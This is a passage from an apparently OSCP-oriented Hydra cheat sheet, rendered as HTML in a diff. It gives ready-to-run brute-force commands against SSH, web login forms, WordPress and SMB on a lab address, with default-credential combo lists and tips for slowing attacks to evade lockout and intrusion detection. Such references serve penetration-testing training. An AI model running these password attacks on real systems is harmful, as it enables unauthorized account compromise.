+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>:F<span class="o">=</span>Invalid<span class="w"> </span>username
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>:F<span class="o">=</span>Login<span class="w"> </span>failed
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>:F<span class="o">=</span>Incorrect<span class="w"> </span>password
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>:F<span class="o">=</span>Access<span class="w"> </span>denied
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="c1"># Bad failure strings (too generic):</span>
+</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>:F<span class="o">=</span>Login
+</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>:F<span class="o">=</span>Password
+</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a>:F<span class="o">=</span>Username
+</span></code></pre></div>
+<h3 id="handling-redirects">Handling Redirects</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># If login redirects on success</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="c1"># Use success string from redirect location</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>:S<span class="o">=</span>dashboard
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>:S<span class="o">=</span>admin<span class="w"> </span>panel
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>:S<span class="o">=</span>Welcome
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="c1"># Or use HTTP status code (302 redirect on success)</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>:S<span class="o">=</span><span class="m">302</span>
+</span></code></pre></div>
+<h3 id="multiple-parameter-formats">Multiple Parameter Formats</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># Standard form</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="nv">username</span><span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>^PASS^
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="c1"># Email-based</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="nv">email</span><span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>^PASS^
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="c1"># Abbreviated</span>
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="nv">user</span><span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">pass</span><span class="o">=</span>^PASS^
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>
+</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="c1"># With submit button</span>
+</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a><span class="nv">username</span><span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>^PASS^<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span>Login
+</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>
+</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="c1"># With hidden fields</span>
+</span><span id="__span-33-14"><a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="nv">username</span><span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>^PASS^<span class="p">&amp;</span><span class="nv">csrf</span><span class="o">=</span>token123<span class="p">&amp;</span><span class="nv">action</span><span class="o">=</span>login
+</span></code></pre></div>
+<hr />
+<h2 id="advanced-techniques">Advanced Techniques</h2>
+<h3 id="using-proxy">Using Proxy</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># Through HTTP proxy</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">HYDRA_PROXY</span><span class="o">=</span>http://127.0.0.1:8080
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>target<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;...&quot;</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="c1"># Through SOCKS proxy</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="nb">export</span><span class="w"> </span><span class="nv">HYDRA_PROXY</span><span class="o">=</span>socks4://127.0.0.1:9050
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>target<span class="w"> </span>ssh
+</span></code></pre></div>
+<h3 id="rate-limiting-bypass">Rate Limiting Bypass</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># Slower attack to avoid detection/lockout</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>-w<span class="w"> </span><span class="m">30</span><span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="c1"># Very slow (1 task, 60 second wait)</span>
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>-w<span class="w"> </span><span class="m">60</span><span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>ssh
+</span></code></pre></div>
+<h3 id="resume-attack">Resume Attack</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># Hydra creates restore file automatically</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="c1"># If interrupted, resume with:</span>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>hydra<span class="w"> </span>-R
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="c1"># Or specify restore file</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>hydra<span class="w"> </span>-R<span class="w"> </span>hydra.restore
+</span></code></pre></div>
+<h3 id="custom-usernamepassword-combinations">Custom Username/Password Combinations</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1"># Create combo file (user:pass format)</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>combo.txt<span class="w"> </span><span class="s">&lt;&lt; EOF</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="s">admin:admin</span>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="s">admin:password</span>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="s">root:root</span>
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="s">root:toor</span>
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="s">administrator:admin</span>
+</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="s">EOF</span>
+</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>
+</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="c1"># Use combo file</span>
+</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a>hydra<span class="w"> </span>-C<span class="w"> </span>combo.txt<span class="w"> </span>ssh://192.168.1.100
+</span></code></pre></div>
+<h3 id="testing-single-credentials">Testing Single Credentials</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1"># Test single user:pass combo</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>admin123<span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="c1"># Verify credentials work</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>admin123<span class="w"> </span>-V<span class="w"> </span>ssh://192.168.1.100
+</span></code></pre></div>
+<hr />
+<h2 id="common-oscp-scenarios">Common OSCP Scenarios</h2>
+<h3 id="scenario-1-basic-web-login">Scenario 1: Basic Web Login</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1"># 1. View page source to identify form fields</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>curl<span class="w"> </span>http://192.168.1.100/login.php
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="c1"># 2. Test failed login to find error message</span>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://192.168.1.100/login.php<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=test&amp;password=test&quot;</span>
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>
+</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="c1"># 3. Run Hydra</span>
+</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="w">  </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="w">  </span><span class="s2">&quot;/login.php:username=^USER^&amp;password=^PASS^:F=Invalid&quot;</span>
+</span></code></pre></div>
+<h3 id="scenario-2-ssh-with-custom-port">Scenario 2: SSH with Custom Port</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># 1. Confirm SSH on custom port</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">22222</span><span class="w"> </span><span class="m">192</span>.168.1.100
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="c1"># 2. Try common usernames</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>hydra<span class="w"> </span>-L<span class="w"> </span>/usr/share/seclists/Usernames/top-usernames-shortlist.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="w">  </span>-P<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="w">  </span>-s<span class="w"> </span><span class="m">22222</span><span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>ssh
+</span></code></pre></div>
+<h3 id="scenario-3-wordpress-login">Scenario 3: WordPress Login</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># Standard WordPress login</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="w">  </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="w">  </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="w">  </span><span class="s2">&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username&quot;</span>
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="c1"># Alternative (using xmlrpc.php)</span>
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="w">  </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="w">  </span><span class="m">192</span>.168.1.100<span class="w"> </span>http-post-form<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a><span class="w">  </span><span class="s2">&quot;/xmlrpc.php:log=^USER^&amp;pwd=^PASS^:F=403&quot;</span>
+</span></code></pre></div>
+<h3 id="scenario-4-smb-with-domain">Scenario 4: SMB with Domain</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c1"># Local account</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="w">  </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="w">  </span>smb://192.168.1.100
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="c1"># Domain account</span>
+</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>hydra<span class="w"> </span>-l<span class="w"> </span><span class="s2">&quot;DOMAIN\\username&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a><span class="w">  </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a><span class="w">  </span>smb://192.168.1.100
+</span></code></pre></div>
+<hr />
+<h2 id="troubleshooting">Troubleshooting</h2>
+<h3 id="common-issues">Common Issues</h3>
+<p><strong>1. "[ERROR] target does not support password authentication"</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1"># SSH: Server may use key-based auth only</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="c1"># Try different service or check SSH config</span>
+</span></code></pre></div></p>
+<p><strong>2. "[ERROR] could not connect to target port"</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c1"># Verify port is open</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>nmap<span class="w"> </span>-p<span class="w"> </span>PORT<span class="w"> </span>target
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="c1"># Check firewall rules</span>
+</span></code></pre></div></p>
+<p><strong>3. No matches found but credentials work manually</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c1"># Wrong failure string - recheck error message</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="c1"># Missing required headers/cookies</span>
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="c1"># CSRF token required</span>
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="c1"># Check for JavaScript-based login</span>
+</span></code></pre></div></p>
+<p><strong>4. Too many false positives</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c1"># Failure string is too generic</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="c1"># Use more specific failure text</span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="c1"># Or use success string instead (:S=)</span>
+</span></code></pre></div></p>
+<h3 id="debugging-tips">Debugging Tips</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1"># Verbose output to see attempts</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>hydra<span class="w"> </span>-V<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="nb">test</span><span class="w"> </span>target<span class="w"> </span>ssh
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="c1"># Very verbose (debug mode)</span>
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>hydra<span class="w"> </span>-vV<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="nb">test</span><span class="w"> </span>target<span class="w"> </span>ssh
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a><span class="c1"># Test with known valid credentials first</span>
+</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span>correct_password<span class="w"> </span>-V<span class="w"> </span>target<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;...&quot;</span>
+</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>
+</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a><span class="c1"># Use single thread for debugging</span>
+</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a>hydra<span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>-V<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>target<span class="w"> </span>ssh
+</span></code></pre></div>
+<hr />
+<h2 id="performance-optimization">Performance Optimization</h2>
+<h3 id="speed-vs-stealth">Speed vs Stealth</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c1"># Fast (may trigger IDS/IPS)</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">64</span><span class="w"> </span>target<span class="w"> </span>ssh
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="c1"># Balanced</span>
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">16</span><span class="w"> </span>target<span class="w"> </span>ssh<span class="w">  </span><span class="c1"># Default</span>
+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="c1"># Slow (stealthy)</span>
+</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>-w<span class="w"> </span><span class="m">30</span><span class="w"> </span>target<span class="w"> </span>ssh
+</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a>
+</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="c1"># Very slow (avoid detection)</span>
+</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>-w<span class="w"> </span><span class="m">60</span><span class="w"> </span>target<span class="w"> </span>ssh
+</span></code></pre></div>
+<h3 id="wordlist-strategy">Wordlist Strategy</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># 1. Start small (fast results)</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>top-100.txt<span class="w"> </span>target<span class="w"> </span>ssh
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="c1"># 2. Medium list</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>top-1000.txt<span class="w"> </span>target<span class="w"> </span>ssh
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="c1"># 3. Large list (if time permits)</span>
+</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>rockyou.txt<span class="w"> </span>target<span class="w"> </span>ssh
+</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a>
+</span><span id="__span-49-10"><a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a><span class="c1"># 4. Custom list based on recon</span>
